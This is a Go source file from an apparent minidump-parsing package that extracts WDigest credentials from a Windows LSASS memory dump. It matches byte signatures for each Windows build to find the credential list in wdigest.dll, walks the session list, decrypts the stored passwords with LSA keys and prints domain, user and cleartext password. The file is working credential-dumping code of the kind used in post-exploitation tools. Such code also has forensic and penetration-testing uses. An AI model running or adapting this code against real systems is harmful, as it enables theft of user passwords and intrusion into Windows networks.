package minidump

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

// WdigestPattern contains signature and offsets for finding WDIGEST credentials
type WdigestPattern struct {
	Signature        []byte
	FirstEntryOffset int
	PrimaryOffset    int
	BuildNumber      uint32
}

// GetWdigestPattern returns the pattern for the given Windows build number
func GetWdigestPattern(buildNumber uint32) *WdigestPattern {
	// Windows 11+ (Build 22000+)
	if buildNumber >= 22000 {
		return &WdigestPattern{
			Signature:        []byte{0x48, 0x3b, 0xc6, 0x74, 0x11, 0x8b, 0x4b, 0x20, 0x39, 0x48},
			FirstEntryOffset: -4,
			PrimaryOffset:    48,
			BuildNumber:      buildNumber,
		}
	}
	// Windows Vista through Windows 10 (Build 6000-21999)
	if buildNumber >= 6000 {
		return &WdigestPattern{
			Signature:        []byte{0x48, 0x3b, 0xd9, 0x74},
			FirstEntryOffset: -4,
			PrimaryOffset:    48,
			BuildNumber:      buildNumber,
		}
	}
	// Older versions
	return nil
}

// WdigestCredential represents extracted WDIGEST credentials
type WdigestCredential struct {
	Username    string
	Domain      string
	Password    string
	PasswordHex string
	LUID        uint64
}

// FindWdigestCredentials searches for WDIGEST credentials in the dump
func (d *Dump) FindWdigestCredentials(keys *LSAKeys) ([]WdigestCredential, error) {
	if keys == nil {
		return nil, nil
	}

	pattern := GetWdigestPattern(d.SystemInfo.BuildNumber)
	if pattern == nil {
		return nil, fmt.Errorf("unsupported build for WDIGEST: %d", d.SystemInfo.BuildNumber)
	}

	// Find wdigest.dll module
	wdigestDll := d.FindModule("wdigest.dll")
	if wdigestDll == nil {
		return nil, fmt.Errorf("wdigest.dll not found in dump")
	}

	// Get wdigest.dll memory region
	wdigestMem, wdigestBase := d.GetModuleMemory(wdigestDll)
	if wdigestMem == nil {
		return nil, fmt.Errorf("failed to read wdigest.dll memory")
	}

	// Search for the signature
	sigOffset := bytes.Index(wdigestMem, pattern.Signature)
	if sigOffset < 0 {
		return nil, fmt.Errorf("WDIGEST signature not found")
	}

	// Read the RIP-relative offset
	ripOffset := sigOffset + pattern.FirstEntryOffset
	if ripOffset < 0 || ripOffset+4 > len(wdigestMem) {
		return nil, fmt.Errorf("invalid RIP offset for WDIGEST")
	}

	relOffset := int32(binary.LittleEndian.Uint32(wdigestMem[ripOffset:]))
	firstEntryVA := wdigestBase + uint64(sigOffset) + uint64(pattern.FirstEntryOffset) + 4 + uint64(relOffset)

	// Read pointer to first entry
	firstEntryOffset := d.VAToOffset(firstEntryVA)
	if firstEntryOffset < 0 || int(firstEntryOffset)+8 > len(d.Memory) {
		return nil, fmt.Errorf("invalid first WDIGEST entry offset")
	}

	firstSessionVA := binary.LittleEndian.Uint64(d.Memory[firstEntryOffset:])
	if firstSessionVA == 0 {
		return nil, nil
	}

	var credentials []WdigestCredential
	visited := make(map[uint64]bool)
	currentVA := firstSessionVA

	// Walk the linked list
	for i := 0; i < 256 && currentVA != 0; i++ {
		if visited[currentVA] {
			break
		}
		visited[currentVA] = true

		cred := d.parseWdigestEntry(currentVA, pattern.PrimaryOffset, keys)
		if cred != nil && (cred.Username != "" || cred.Password != "") {
			credentials = append(credentials, *cred)
		}

		// Get next entry
		entryOffset := d.VAToOffset(currentVA)
		if entryOffset < 0 || int(entryOffset)+8 > len(d.Memory) {
			break
		}
		currentVA = binary.LittleEndian.Uint64(d.Memory[entryOffset:])
		if currentVA == firstSessionVA {
			break
		}
	}

	return credentials, nil
}

// parseWdigestEntry parses a WdigestListEntry structure
func (d *Dump) parseWdigestEntry(entryVA uint64, primaryOffset int, keys *LSAKeys) *WdigestCredential {
	entryOffset := d.VAToOffset(entryVA)
	if entryOffset < 0 || int(entryOffset)+0x80 > len(d.Memory) {
		return nil
	}

	data := d.Memory[entryOffset:]

	// WdigestListEntry structure (x64):
	// 0x00: Flink (8)
	// 0x08: Blink (8)
	// 0x10: UsageCount (4)
	// 0x14: padding (4)
	// 0x18: This (8)
	// 0x20: LUID (8)
	// 0x28: UsageCount2 (4)
	// 0x2c: padding
	// 0x30: UserName (LSA_UNICODE_STRING, 16)
	// 0x40: Domaine (LSA_UNICODE_STRING, 16)
	// 0x50: Password (LSA_UNICODE_STRING, 16) - encrypted

	cred := &WdigestCredential{}
	cred.LUID = binary.LittleEndian.Uint64(data[0x20:])
	cred.Username = d.readLSAUnicodeString(data, 0x30)
	cred.Domain = d.readLSAUnicodeString(data, 0x40)

	// Read encrypted password
	pwdLength := binary.LittleEndian.Uint16(data[0x50:])
	pwdBufferVA := binary.LittleEndian.Uint64(data[0x58:])

	if pwdLength > 0 && pwdBufferVA != 0 && pwdLength < 1024 {
		pwdOffset := d.VAToOffset(pwdBufferVA)
		if pwdOffset >= 0 && int(pwdOffset)+int(pwdLength) <= len(d.Memory) {
			encPwd := d.Memory[pwdOffset : int(pwdOffset)+int(pwdLength)]
			decPwd := d.decryptKerberosBlob(encPwd, keys) // Same decryption logic
			if decPwd != nil {
				cred.PasswordHex = bytesToHex(decPwd)
				cred.Password = utf16ToString(decPwd)
			}
		}
	}

	return cred
}

// FormatWdigestCredential formats a WDIGEST credential for display
func FormatWdigestCredential(cred WdigestCredential) string {
	result := fmt.Sprintf("Domain: %s | User: %s", cred.Domain, cred.Username)
	if cred.Password != "" {
		result += fmt.Sprintf(" | Password: %s", cred.Password)
	}
	return result
}
